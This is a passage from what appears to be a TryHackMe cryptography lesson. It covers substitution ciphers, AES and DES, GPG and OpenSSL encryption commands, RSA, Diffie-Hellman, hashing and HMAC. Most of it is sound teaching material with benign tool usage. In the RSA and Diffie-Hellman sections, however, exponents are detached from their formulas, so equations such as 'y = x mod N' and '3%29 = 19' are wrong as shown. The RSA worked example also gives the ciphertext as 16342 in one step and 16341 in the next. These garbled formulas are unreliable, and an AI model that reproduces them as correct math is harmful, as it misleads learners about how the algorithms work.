“abcdefghijklmnopqrstuvwxyz” to be mapped to 
“xpatvrzyjhecsdikbfwunqgmol” respectively. In other words, “a” becomes 
“x”, “b” becomes “p”, and so on. The recipient needs to know the key, 
“xpatvrzyjhecsdikbfwunqgmol”, to decrypt the encrypted messages 
successfully.

This algorithm might look very secure, especially since trying all 
the possible keys is not feasible. However, different techniques can be 
used to break a ciphertext using such an encryption algorithm. One 
weakness of such an algorithm is letter frequency. In English texts, the
 most common letters are ‘e’, ‘t’, and ‘a’, as they appear at a 
frequency of 13%, 9.1%, and 8.2%, respectively. Moreover, in English 
texts, the most common first letters are ‘t’, ‘a’, and ‘o’, as they 
appear at 16%, 11.7% and 7.6%, respectively. Add to this the fact that 
most of the message words are dictionary words, and you will be able to 
break an encrypted text with the alphabetic substitution cipher in no 
time.

We don’t really need to use the encryption key to decrypt the 
received ciphertext, “Uyv sxd gyi siqvw x sinduxjd pvzjdw po axffojdz 
xgxo wsxcc wuidvw.” As shown in the figure below, using a website such 
as [quipqiup](https://www.quipqiup.com/), it will take a 
moment to discover that the original text was “The man who moves a 
mountain begins by carrying away small stones.” This example clearly 
indicates that this algorithm is broken and should not be used for 
confidential communication.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0b4ac26e6f49c1156b6dc5c283b413a7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0b4ac26e6f49c1156b6dc5c283b413a7.png)

**Symmetric Encryption**

Let’s review some terminology:

- **Cryptographic Algorithm** or **Cipher**: This algorithm defines the encryption and decryption processes.
- **Key**: The cryptographic algorithm needs a key to convert the plaintext into ciphertext and vice versa.
- **plaintext** is the original message that we want to encrypt
- **ciphertext** is the message in its encrypted form

A symmetric encryption algorithm uses the same key for encryption and
 decryption. Consequently, the communicating parties need to agree on a 
secret key before being able to exchange any messages.

In the following figure, the sender provides the *encrypt* process with the plaintext and the key to get the ciphertext. The ciphertext is usually sent over some communication channel.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/dc0cc0d61133400277c47d039d8d69e1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/dc0cc0d61133400277c47d039d8d69e1.png)

On the other end, the recipient provides the *decrypt* process
 with the same key used by the sender to recover the original plaintext 
from the received ciphertext. Without knowledge of the key, the 
recipient won’t be able to recover the plaintext.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/4003a3e6e0ecd139078eefe30a336ce2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/4003a3e6e0ecd139078eefe30a336ce2.png)

National Institute of Standard and Technology (NIST)
 published the Data Encryption Standard (DES) in 1977. DES is a 
symmetric encryption algorithm that uses a key size of 56 bits. In 1997,
 a challenge to break a message encrypted using DES was solved. 
Consequently, it was demonstrated that it had become feasible to use a 
brute-force search to find the key and break a message encrypted using 
DES. In 1998, a DES key was broken in 56 hours. These cases indicated 
that DES could no longer be considered secure.

NIST
 published the Advanced Encryption Standard (AES) in 2001. Like DES, it 
is a symmetric encryption algorithm; however, it uses a key size of 128,
 192, or 256 bits, and it is still considered secure and in use today. 
AES repeats the following four transformations multiple times:

1. `SubBytes(state)`: This transformation looks up each byte in a given substitution table (S-box) and substitutes it with the
respective value. The `state` is 16 bytes, i.e., 128 bits, saved in a 4 by 4 array.
2. `ShiftRows(state)`: The second row is shifted by one
place, the third row is shifted by two places, and the fourth row is
shifted by three places. This is shown in the figure below.
3. `MixColumns(state)`: Each column is multiplied by a fixed matrix (4 by 4 array).
4. `AddRoundKey(state)`: A round key is added to the state using the XOR operation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/049bad7deb4e6dd426335d7c3477f10a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/049bad7deb4e6dd426335d7c3477f10a.png)

The total number of transformation rounds depends on the key size.

Don’t worry if you find this cryptic because it is! Our purpose is not to learn the details of how AES
 works nor to implement it as a programming library; the purpose is to 
appreciate the difference in complexity between ancient encryption 
algorithms and modern ones. If you are curious to dive into details, you
 can check the AES specifications, including pseudocode and examples in 
its published standard, [FIPS PUB 197](https://csrc.nist.gov/publications/detail/fips/197/final).

In addition to AES,
 many other symmetric encryption algorithms are considered secure. Here 
is a list of symmetric encryption algorithms supported by GPG (GnuPG) 
2.37.7, for example:

| Encryption Algorithm | Notes |
| --- | --- |
| AES, AES192, and AES256 | AES with a key size of 128, 192, and 256 bits |
| IDEA | International Data Encryption Algorithm (IDEA) |
| 3DES | Triple DES (Data Encryption Standard) and is based on DES. We should note that 3DES will be deprecated in 2023 and disallowed in 2024. |
| CAST5 | Also known as CAST-128. Some sources state that CASE stands for the names of its authors: Carlisle Adams and Stafford Tavares. |
| BLOWFISH | Designed by Bruce Schneier |
| TWOFISH | Designed by Bruce Schneier and derived from Blowfish |
| CAMELLIA128, CAMELLIA192, and CAMELLIA256 | Designed by Mitsubishi Electric and NTT in Japan. Its name is derived from the flower camellia japonica. |

All the algorithms mentioned so far are block cipher symmetric 
encryption algorithms. A block cipher algorithm converts the input 
(plaintext) into blocks and encrypts each block. A block is usually 128 
bits. In the figure below, we want to encrypt the plaintext “TANGO HOTEL
 MIKE”, a total of 16 characters. The first step is to represent it in 
binary. If we use ASCII, “T” is `0x54` in hexadecimal format, “A” is `0x41`,
 and so on. Every two hexadecimal digits constitute 8 bits and represent
 one byte. A block of 128 bits is practically 16 bytes and is 
represented in a 4 by 4 array. The 128-bit block is fed as one unit to 
the encryption method.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2d69973a4fbf8220e64c3e896841b21d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2d69973a4fbf8220e64c3e896841b21d.png)

The other type of symmetric encryption algorithm is stream ciphers, 
which encrypt the plaintext byte by byte. Consider the case where we 
want to encrypt the message “TANGO HOTEL MIKE”; each character needs to 
be converted to its binary representation. If we use ASCII, “T” is `0x54` in hexadecimal, while “A” is `0x41`, and so on. The encryption method will process one byte at a time. This is represented in the figure below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/6c0edb0faf15df0c6675c6829fddae01.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/6c0edb0faf15df0c6675c6829fddae01.png)

Symmetric encryption solves many security problems discussed in the [Security Principles](https://tryhackme.com/room/securityprinciples)
 room. Let’s say that Alice and Bob met and chose an encryption 
algorithm and agreed on a specific key. We assume that the selected 
encryption algorithm is secure and that the secret key is kept safe. 
Let’s take a look at what we can achieve:

- **Confidentiality**: If Eve intercepted the encrypted
message, she wouldn’t be able to recover the plaintext. Consequently,
all messages exchanged between Alice and Bob are confidential as long as they are sent encrypted.
- **Integrity**: When Bob receives an encrypted message
and decrypts it successfully using the key he agreed upon with Alice,
Bob can be sure that no one could tamper with the message across the
channel. When using secure modern encryption algorithms, any minor
modification to the ciphertext would prevent successful decryption or
would lead to gibberish as plaintext.
- **Authenticity**: Being able to decrypt the ciphertext
using the secret key also proves the authenticity of the message because only Alice and Bob know the secret key.

We are just getting started, and we know how to maintain 
confidentiality, check the integrity and ensure the authenticity of the 
exchanged messages. More practical and efficient approaches will be 
presented in later tasks. The question, for now, is whether this is 
scalable.

With Alice and Bob, we needed one key. If we have Alice, Bob, and 
Charlie, we need three keys: one for Alice and Bob, another for Alice 
and Charlie, and a third for Bob and Charlie. However, the number of 
keys grows quickly; communication between 100 users requires almost 5000
 different secret keys. (If you are curious about the mathematics behind
 it, that’s 99 + 98 + 97 + … + 1 = 4950).

Moreover, if one system gets compromised, they need to create new 
keys to be used with the other 99 users. Another problem would be 
finding a secure channel to exchange the keys with all the other users. 
Obviously, this quickly grows out of hand.

In the next task, we will cover asymmetric encryption. One of the 
problems solved with asymmetric encryption is when 100 users only need 
to share a total of 100 keys to communicate securely. (As explained 
earlier, symmetric encryption would require around 5000 keys to secure 
the communications for 100 users.)

There are many programs available for symmetric encryption. We will 
focus on two, which are widely used for asymmetric encryption as well:

- GNU Privacy Guard
- OpenSSL Project

### GNU Privacy Guard

The [GNU Privacy Guard](https://gnupg.org/), also known as GnuPG or GPG, implements the OpenPGP standard.

We can encrypt a file using GnuPG (GPG) using the following command:

`gpg --symmetric --cipher-algo CIPHER message.txt`, where CIPHER is the name of the encryption algorithm. You can check supported ciphers using the command `gpg --version`. The encrypted file will be saved as `message.txt.gpg`.

The default output is in the binary OpenPGP format; however, if you 
prefer to create an ASCII armoured output, which can be opened in any 
text editor, you should add the option `--armor`. For example, `gpg --armor --symmetric --cipher-algo CIPHER message.txt`.

You can decrypt using the following command:

`gpg --output original_message.txt --decrypt message.gpg`

### OpenSSL Project

The [OpenSSL Project](https://www.openssl.org/) maintains the OpenSSL software.

We can encrypt a file using OpenSSL using the following command:

`openssl aes-256-cbc -e -in message.txt -out encrypted_message`

We can decrypt the resulting file using the following command:

`openssl aes-256-cbc -d -in encrypted_message -out original_message.txt`

To make the encryption more secure and resilient against brute-force attacks, we can add `-pbkdf2`
 to use the Password-Based Key Derivation Function 2 (PBKDF2); moreover,
 we can specify the number of iterations on the password to derive the 
encryption key using `-iter NUMBER`. To iterate 10,000 times, the previous command would become:

`openssl aes-256-cbc -pbkdf2 -iter 10000 -e -in message.txt -out encrypted_message`

Consequently, the decryption command becomes:

`openssl aes-256-cbc -pbkdf2 -iter 10000 -d -in encrypted_message -out original_message.txt`

**Asymmetric Encryption**

Symmetric encryption 
requires the users to find a secure channel to exchange keys. By secure 
channel, we are mainly concerned with confidentiality and integrity. In 
other words, we need a channel where no third party can eavesdrop and 
read the traffic; moreover, no one can change the sent messages and 
data.

Asymmetric encryption makes it possible to exchange encrypted 
messages without a secure channel; we just need a reliable channel. By 
reliable channel, we mean that we are mainly concerned with the 
channel’s integrity and not confidentiality.

When using an asymmetric encryption algorithm, we would generate a 
key pair: a public key and a private key. The public key is shared with 
the world, or more specifically, with the people who want to communicate
 with us securely. The private key must be saved securely, and we must 
never let anyone access it. Moreover, it is not feasible to derive the 
private key despite the knowledge of the public key.

How does this key pair work?

If a message is encrypted with one key, it can be decrypted with the other. In other words:

- If Alice encrypts a message using Bob’s public key, it can be decrypted only using Bob’s private key.
- Reversely, if Bob encrypts a message using his private key, it can only be decrypted using Bob’s public key.

### Confidentiality

We can use asymmetric encryption to achieve confidentiality by 
encrypting the messages using the recipient’s public key. In the 
following two figures, we can see that:

Alice wants to ensure confidentiality in her communication with Bob. 
She encrypts the message using Bob’s public key, and Bob decrypts them 
using his private key. Bob’s public key is expected to be published on a
 public database or on his website, for instance.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/684696712007bfb81595bc823deb6293.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/684696712007bfb81595bc823deb6293.png)

When Bob wants to reply to Alice, he encrypts his messages using 
Alice’s public key, and Alice can decrypt them using her private key.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/321e8f02228699aab1a333791fe57d4a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/321e8f02228699aab1a333791fe57d4a.png)

In other words, it becomes easy to communicate with Alice and Bob 
while ensuring the confidentiality of the messages. The only requirement
 is that all parties have their public keys available for interested 
senders.

Note: In practice, symmetric encryption algorithms allow faster 
operations than asymmetric encryption; therefore, we will cover later 
how we can use the best of both worlds.

### Integrity, Authenticity, and Nonrepudiation

Beyond confidentiality, asymmetric encryption can solve integrity, 
authenticity and nonrepudiation. Let’s say that Bob wants to make a 
statement and wants everyone to be able to confirm that this statement 
indeed came from him. Bob needs to encrypt the message using his private
 key; the recipients can decrypt it using Bob’s public key. If the 
message decrypts successfully with Bob’s public key, it means that the 
message was encrypted using Bob’s private key. (In practice, he would 
encrypt a hash of the original message. We will elaborate on this 
later.)

Being decrypted successfully using Bob’s public key leads to a few interesting conclusions.

- First, the message was not altered across the way (communication channel); this proves the message *integrity*.
- Second, knowing that no one has access to Bob’s private key, we can
be sure that this message did indeed come from Bob; this proves the
message *authenticity*.
- Finally, because no one other than Bob has access to Bob’s private key, Bob cannot deny sending this message; this establishes *nonrepudiation*.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/11329c3e017fe2016fc21bc789b29259.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/11329c3e017fe2016fc21bc789b29259.png)

We have seen how asymmetric encryption can help establish 
confidentiality, integrity, authenticity, and nonrepudiation. In 
real-life scenarios, asymmetric encryption can be relatively slow to 
encrypt large files and vast amounts of data. In another task, we will 
see how we can use asymmetric encryption in conjunction with symmetric 
encryption to achieve these security objectives relatively faster.

### RSA

RSA got its name from its inventors, Rivest, Shamir, and Adleman. It works as follows:

1. Choose two random prime numbers, *p* and *q*. Calculate *N* = *p* × *q*.
2. Choose two integers *e* and *d* such that *e* × *d* = 1 mod *ϕ*(*N*), where *ϕ*(*N*) = *N* − *p* − *q* + 1. This step will let us generate the public key (*N*,*e*) and the private key (*N*,*d*).
3. The sender can encrypt a value *x* by calculating *y* = *x* mod *N*. (Modulus)
    
    *e*
    
4. The recipient can decrypt *y* by calculating *x* = *y* mod *N*. Note that *y* = *x* = *x* = (*x*) × *x* = *x*. This step explains why we put a restriction on the choice of *e* and *d*.
    
    *d*
    
    *d*
    
    *ed*
    
    *kϕ*(*N*) + 1
    
    *ϕ*(*N*)
    
    *k*
    

Don’t worry if the above mathematical equations looked too 
complicated; you don’t need mathematics to be able to use RSA, as it is 
readily available via programs and programming libraries.

RSA security relies on factorization being a hard problem. It is easy to multiply *p* by *q*; however, it is time-consuming to find *p* and *q* given *N*. Moreover, for this to be secure, *p* and *q*
 should be pretty large numbers, for example, each being 1024 bits 
(that’s a number with more than 300 digits). It is important to note 
that RSA relies on secure random number generation, as with other 
asymmetric encryption algorithms. If an adversary can guess *p* and *q*, the whole system would be considered insecure.

Let’s consider the following practical example.

1. Bob chooses two prime numbers: *p* = 157 and *q* = 199. He calculates *N* = 31243.
2. With *ϕ*(*N*) = *N* − *p* − *q* + 1 = 31243 − 157 − 199 + 1 = 30888, Bob selects *e* = 163 and *d* = 379 where *e* × *d* = 163 × 379 = 61777 and 61777 mod 30888 = 1. The public key is (31243,163) and the private key is (31243,379).
3. Let’s say that the value to encrypt is *x* = 13, then Alice would calculate and send *y* = *x* mod *N* = 13 mod 31243 = 16342.
    
    *e*
    
    163
    
4. Bob will decrypt the received value by calculating *x* = *y* mod *N* = 16341 mod 31243 = 13.
    
    *d*
    
    379
    

The previous example was to understand the mathematics behind it better. To see real values for *p* and *q*, let’s create a real keypair using a tool such as `openssl`.

Terminal

```
user@TryHackMe$ openssl genrsa -out private-key.pem 2048user@TryHackMe$ openssl rsa -in private-key.pem -pubout -out public-key.pemwriting RSA key

user@TryHackMe$ cat public-key.pem-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAymcAeYg1ohPQLHu7u9l1
UutN8bCP7r6czRX2zrQrpElYrm5mHERi1xweWEhTJ/0Q13FJcHLGtLbdQc0rGpOd
DnYJBuzrqXU2hC7E7dlqLsj63NPADqlOGYCGCWnm/HGM2WuVtDXqRitN4zeNKEWI
QmEctfucopZx5AVJ1vTn+qMv/0D6QU7Mm65MTSYg1SCRA0D0N9NLMj4rYlLOIr5q
5g3iunAE4tCROMcHf7fxWMuWdJTdtxTv7+4P5XGkWrWriO22JFHp9N22Fm96V9jH
7aASRkIZvQFmx+1dl7btZDhsm2ezU07LBabv9efj0gIwz6P3mTJVm+wxaDH6jiXB
dwIDAQAB
-----END PUBLIC KEY-----

user@TryHackMe$ openssl rsa -in private-key.pem -text -nooutPrivate-Key: (2048 bit, 2 primes)
modulus:
    00:ca:67:00:79:88:35:a2:13:d0:2c:7b:bb:bb:d9:
    75:52:eb:4d:f1:b0:8f:ee:be:9c:cd:15:f6:ce:b4:
    2b:a4:49:58:ae:6e:66:1c:44:62:d7:1c:1e:58:48:
    53:27:fd:10:d7:71:49:70:72:c6:b4:b6:dd:41:cd:
    2b:1a:93:9d:0e:76:09:06:ec:eb:a9:75:36:84:2e:
    c4:ed:d9:6a:2e:c8:fa:dc:d3:c0:0e:a9:4e:19:80:
    86:09:69:e6:fc:71:8c:d9:6b:95:b4:35:ea:46:2b:
    4d:e3:37:8d:28:45:88:42:61:1c:b5:fb:9c:a2:96:
    71:e4:05:49:d6:f4:e7:fa:a3:2f:ff:40:fa:41:4e:
    cc:9b:ae:4c:4d:26:20:d5:20:91:03:40:f4:37:d3:
    4b:32:3e:2b:62:52:ce:22:be:6a:e6:0d:e2:ba:70:
    04:e2:d0:91:38:c7:07:7f:b7:f1:58:cb:96:74:94:
    dd:b7:14:ef:ef:ee:0f:e5:71:a4:5a:b5:ab:88:ed:
    b6:24:51:e9:f4:dd:b6:16:6f:7a:57:d8:c7:ed:a0:
    12:46:42:19:bd:01:66:c7:ed:5d:97:b6:ed:64:38:
    6c:9b:67:b3:53:4e:cb:05:a6:ef:f5:e7:e3:d2:02:
    30:cf:a3:f7:99:32:55:9b:ec:31:68:31:fa:8e:25:
    c1:77
publicExponent: 65537 (0x10001)
privateExponent:
    10:fe:00:be:33:3f:3d:72:28:61:f3:a9:59:25:f2:
    81:99:9b:9b:94:d5:20:98:04:15:fb:a8:12:c6:71:
    7b:83:64:dc:90:0c:26:87:5f:3c:eb:f1:68:3b:fa:
    2f:3b:41:b4:b4:a0:13:be:af:0b:f0:e6:36:66:01:
    1e:64:12:25:6a:a7:6b:5b:6c:95:77:6f:b2:3d:32:
    ef:3c:f7:7b:22:08:5d:8d:b1:6c:09:ae:b2:d9:65:
    67:58:ea:b9:7a:d6:f6:51:df:e9:97:35:29:da:ec:
    d9:0c:8a:df:3c:a7:29:db:79:4b:95:ea:1a:84:42:
    df:7f:ca:29:2f:ba:62:02:37:05:c0:b0:c2:ff:42:
    6b:fb:e1:36:40:10:ae:11:0f:d8:87:2f:fe:10:2e:
    a4:60:de:ff:fe:c8:ab:0b:29:fa:6c:20:ec:87:33:
    46:c0:cd:96:36:cb:9b:ca:81:17:e5:c3:eb:34:b2:
    83:0f:52:cc:e9:68:bd:cb:d2:85:2f:fe:c4:47:76:
    df:94:69:ce:7b:8a:50:71:36:96:e6:35:fb:fb:b4:
    4a:ac:63:9b:9d:1b:bb:32:71:31:45:a2:25:33:cc:
    f7:a5:fb:9f:66:b1:4e:30:ce:9d:71:e8:fa:7d:5f:
    33:a0:c1:94:0a:b7:b7:f3:16:7e:4f:ad:89:3d:ba:
    51
prime1:
    00:e0:3d:87:b3:d3:1f:d2:c6:66:23:83:a5:95:d5:
    20:35:f8:d8:c0:94:cf:cc:d2:04:d4:e4:ef:cf:c2:
    94:00:10:cd:d1:4a:df:09:4e:7e:95:f8:70:08:b1:
    20:98:8a:e3:88:f7:cc:a8:32:62:32:68:f6:1f:c0:
    fb:c1:71:41:8c:21:a3:ff:20:e6:96:d0:6e:4b:66:
    61:08:d0:b7:26:48:27:62:a7:d3:ff:36:55:c8:e1:
    ab:91:48:90:fb:b5:b1:92:be:90:06:a8:40:1b:2a:
    2d:53:1e:87:fc:a7:8a:57:72:0b:e5:35:71:7b:dd:
    8c:e5:b5:ab:64:7c:37:c5:0d
prime2:
    00:e7:11:ac:50:f5:dc:16:cf:20:46:77:5d:ca:16:
    29:36:35:89:95:c0:f8:4b:42:ef:03:a0:f1:ce:2e:
    1b:da:55:a9:ff:5a:28:4d:78:c5:8a:e2:55:9b:94:
    b4:56:ec:ab:1b:dd:b8:07:be:dd:d5:0f:49:90:b3:
    ed:a2:d7:78:38:24:d5:9e:7d:a2:e8:8c:e0:2a:33:
    32:21:1f:0e:6b:aa:0b:b4:11:6a:bd:8f:d9:86:3f:
    ad:42:c8:bc:42:23:21:39:8d:0c:60:f2:ca:2a:00:
    0a:8e:de:fb:1a:3c:51:9d:f2:dc:0a:59:80:d6:a4:
    47:5c:02:a3:d0:30:1d:47:93
[...]
```

We executed three commands:

- `openssl genrsa -out private-key.pem 2048`: With `openssl`, we used `genrsa` to generate an RSA private key. Using `out`, we specified that the resulting private key is saved as `private-key.pem`. We added `2048` to specify a key size of 2048 bits.
- `openssl rsa -in private-key.pem -pubout -out public-key.pem`: Using `openssl`, we specified that we are using the RSA algorithm with the `rsa` option. We specified that we wanted to get the public key using `pubout`. Finally, we set the private key as input using `in private-key.pem` and saved the output using `out public-key.pem`.
- `openssl rsa -in private-key.pem -text -noout`: We are curious to see real RSA variables, so we used `text -noout`. The values of *p*, *q*, *N*, *e*, and *d* are `prime1`, `prime2`, `modulus`, `publicExponent`, and `privateExponent`, respectively.

If we already have the recipient’s public key, we can encrypt it with the command `openssl pkeyutl -encrypt -in plaintext.txt -out ciphertext -inkey public-key.pem -pubin`

The recipient can decrypt it using the command `openssl pkeyutl -decrypt -in ciphertext -inkey private-key.pem -out decrypted.txt`

**Diffie-Hellman Key Exchange**

Alice and Bob can 
communicate over an insecure channel. By insecure, we mean that there 
are eavesdroppers who can read the messages exchanged on this channel. 
How can Alice and Bob agree on a secret key in such a setting? One way 
would be to use the Diffie-Hellman key exchange.

Diffie-Hellman is an asymmetric encryption algorithm. It allows the 
exchange of a secret over a public channel. We will skip the modular 
arithmetic background and provide a simple numeric example. We will need
 two mathematical operations: power and modulus. *xp*, i.e., *x* raised to the power *p*, is *x* multiplied by itself *p* times. Furthermore, *x* mod *m*, i.e., *x* modulus *m*, is the remainder of the division of *x* by *m*.

1. Alice and Bob agree on *q* and *g*. For this to work, *q* should be a prime number, and *g* is a number smaller than *q* that satisfies certain conditions. (In modular arithmetic, *g* is a generator.) In this example, we take *q* = 29 and *g* = 3.
2. Alice chooses a random number *a* smaller than *q*. She calculates *A* = (*g*) mod *q*. The number *a* must be kept a secret; however, *A* is sent to Bob. Let’s say that Alice picks the number *a* = 13 and calculates *A* = 3%29 = 19 and sends it to Bob.
    
    *a*
    
    13
    
3. Bob picks a random number *b* smaller than *q*. He calculates *B* = (*g*) mod *q*. Bob must keep *b* a secret; however, he sends *B* to Alice. Let’s consider the case where Bob chooses the number *b* = 15 and calculates *B* = 3%29 = 26. He proceeds to send it to Alice.
    
    *b*
    
    15
    
4. Alice receives *B* and calculates *key* = *B* mod *q*. Numeric example *key* = 26 mod 29 = 10.
    
    *a*
    
    13
    
5. Bob receives *A* and calculates *key* = *A* mod *q*. Numeric example *key* = 19 mod 29 = 10.
    
    *b*
    
    15
    

We can see that Alice and Bob reached the same key.

Although an eavesdropper has learned the values of *q*, *g*, *A*, and *B*, they won’t be able to calculate the secret *key* that Alice and Bob have exchanged. The above steps are summarized in the figure below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/6993f1edbc899d252e949ac403294d52.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/6993f1edbc899d252e949ac403294d52.png)

Although the numbers we have chosen make it easy to find *a* and *b*, even without using a computer, real-world examples would select a *q*
 of 256 bits in length. In decimal numbers, that’s 115 with 75 zeroes to
 its right (I don’t know how to read that either, but I was told it is 
read as 115 quattuorvigintillion). Such a large *q* will make it infeasible to find *a* or *b* despite knowledge of *q*, *g*, *A*, and *B*.

Let’s take a look at actual Diffie-Hellman parameters. We can use `openssl` to generate them; we need to specify the option `dhparam` to indicate that we want to generate Diffie-Hellman parameters along with the specified size in bits, such as `2048` or `4096`.

In the console output below, we can view the prime number `P` and the generator `G` using the command `openssl dhparam -in dhparams.pem -text -noout`. (This is similar to what we did with the RSA private key.)

Terminal

```
user@TryHackMe$ openssl dhparam -out dhparams.pem 2048Generating DH parameters, 2048 bit long safe prime
[...]
$ openssl dhparam -in dhparams.pem -text -noout    DH Parameters: (2048 bit)
    P:
        00:82:3b:9d:b5:29:31:f8:12:fe:21:e1:90:30:37:
        ac:d2:48:41:f7:d7:55:e5:d2:5d:dd:87:67:9e:bd:
        b3:97:df:05:a9:d2:d9:56:4f:66:b5:d9:d8:65:06:
        58:c3:8f:b3:0e:30:d2:9a:0b:c3:0a:56:8d:fc:0f:
        f2:e2:9e:4f:16:16:93:4e:b9:a4:c3:9c:09:2d:48:
        a2:ec:b6:97:92:63:a3:b4:75:36:3f:51:77:ca:ac:
        44:6d:99:eb:4d:4a:97:d5:4b:52:c8:07:f8:16:30:
        37:d3:b2:47:30:e6:4e:bc:6a:53:d1:9b:6a:4d:91:
        7a:4b:4f:af:3b:f0:ce:b9:ed:91:4d:8b:52:5a:3f:
        bb:6b:06:ae:32:95:7d:53:da:9b:ce:b0:ec:7d:81:
        25:05:d8:ce:ca:76:e7:d1:5a:31:13:d2:9f:62:b4:
        d5:ad:7d:cd:c9:ab:3d:28:e3:92:27:9f:f3:66:a0:
        be:61:49:cc:47:21:d8:e0:2c:e8:c6:35:4b:2f:ba:
        35:36:8f:bb:41:c6:89:b2:60:3c:62:bb:fe:bf:59:
        d3:7f:05:69:55:dc:61:1b:b4:bb:68:fa:65:1e:2e:
        46:2f:2d:21:62:d1:9f:a0:2b:aa:81:df:3a:f9:7d:
        0b:9d:0e:47:68:01:4f:6e:81:cc:4c:2a:91:fc:8c:
        f4:6f
    G:    2 (0x2)
```

**Hashing**

A cryptographic hash 
function is an algorithm that takes data of arbitrary size as its input 
and returns a fixed size value, called *message digest* or *checksum*, as its output. For example, `sha256sum`
 calculates the SHA256 (Secure Hash Algorithm 256) message digest. 
SHA256, as the name indicates, returns a checksum of size 256 bits (32 
bytes). This checksum is usually written using hexadecimal digits. 
Knowing that a hexadecimal digit represents 4 bits, the 256 bits 
checksum can be represented as 64 hexadecimal digits.

In the terminal output below, we calculate the SHA256 hash values for
 three files of varying sizes: 4 bytes, 275 MB, and 5.2 GB. Using `sha256sum`
 to calculate the message digest for each of the three files, we get 
three completely different values that appear random. It is worth 
stressing that the length of the resulting message digest or checksum is
 the same, no matter how small or big the file is. In particular, the 
four-byte file `abc.txt` and the 5.2 GB file resulted in message digests of equal length independent of the file size.

Terminal

```
user@TryHackMe$ ls -lhtotal 5.5G
-rw-r--r--. 1 strategos strategos    4  7月 21 12:46 abc.txt
-rw-r--r--. 1 strategos strategos 275M  2月 12 19:08 debian-hurd.img.tar.xz
-rw-r--r--. 1 strategos strategos 5.2G  4月 26 16:55 Win11_English_x64v1.iso
$ sha256sum *c38bb113c89d8fec6475a9936411007c45563ecb7ce8acd5db7fb58c0872bda0  abc.txt
0317ff0150e0d64b70284b28c97bb788310585ea7ac46cc8139d5a3c850dea55  debian-hurd.img.tar.xz
4bc6c7e7c61af4b5d1b086c5d279947357cff45c2f82021bb58628c2503eb64e  Win11_English_x64v1.iso
```

But why would we need such a function? There are many uses, in particular:

- Storing passwords: Instead of storing passwords in plaintext, a hash of the password is stored instead. Consequently, if a data breach
occurs, the attacker will get a list of password hashes instead of the
original passwords. (In practice, passwords are also “salted”, as
discussed in a later task.)
- Detecting modifications: Any minor modification to the original file would lead to a drastic change in hash value, i.e. checksum.

In the following terminal output, we have two files, `text1.txt` and `text2.txt`, which are almost identical except for (literally) one bit being different; the letters `T` and `t`
 are different in one bit in their ASCII representation. Even though we 
have flipped only a single bit, it is evident that the SHA256 checksums 
are entirely different. Consequently, if we use a secure hash function 
algorithm, we can easily confirm whether any modifications have taken 
place. This can help protect against both intentional tampering and file
 transfer errors.

Terminal

```
user@TryHackMe$ hexdump text1.txt -C00000000  54 72 79 48 61 63 6b 4d  65 0a                    |TryHackMe.|
0000000a
$ hexdump text2.txt -C00000000  74 72 79 48 61 63 6b 4d  65 0a                    |tryHackMe.|
0000000a
$ sha256sum text1.txtf4616fd825a10ded9af58fbaee09f3e31751d15591f9323ea68b03a0e8ac3783  text1.txt
$ sha256sum text2.txt9ffa3533ee33998aeb1df76026f8031c8af6ccabd8393eca002d5b7471a0b536  text2.txt
```

Some of the hashing algorithms in use and still considered secure are:

- SHA224, SHA256, SHA384, SHA512
- RIPEMD160

Some older hash functions, such as MD5
 (Message Digest 5) and SHA-1, are cryptographically broken. By broken, 
we mean that it is possible to generate a different file with the same 
checksum as a given file. This means that we can create a hash 
collision. In other words, an attacker can create a new message with a 
given checksum, and detecting file or message tampering won’t be 
possible.

### HMAC

Hash-based message authentication code (HMAC) is a message authentication code (MAC) that uses a cryptographic key in addition to a hash function.

According to [RFC2104](https://www.rfc-editor.org/rfc/rfc2104), HMAC needs:

- secret key
- inner pad (ipad) a constant string. (RFC2104 uses the byte `0x36` repeated B times. The value of B depends on the chosen hash function.)
- outer pad (opad) a constant string. (RFC2104 uses the byte `0x5C` repeated B times.)

Calculating the HMAC follows the following steps as shown in the figure:

1. Append zeroes to the key to make it of length B, i.e., to make its length match that of the ipad.
2. Using bitwise exclusive-OR (XOR), represented by ⊕, calculate *key* ⊕ *ipad*.
3. Append the message to the XOR output from step 2.
4. Apply the hash function to the resulting stream of bytes (in step 3).
5. Using XOR, calculate *key* ⊕ *opad*.
6. Append the hash function output from step 4 to the XOR output from step 5.
7. Apply the hash function to the resulting stream of bytes (in step 6) to get the HMAC.

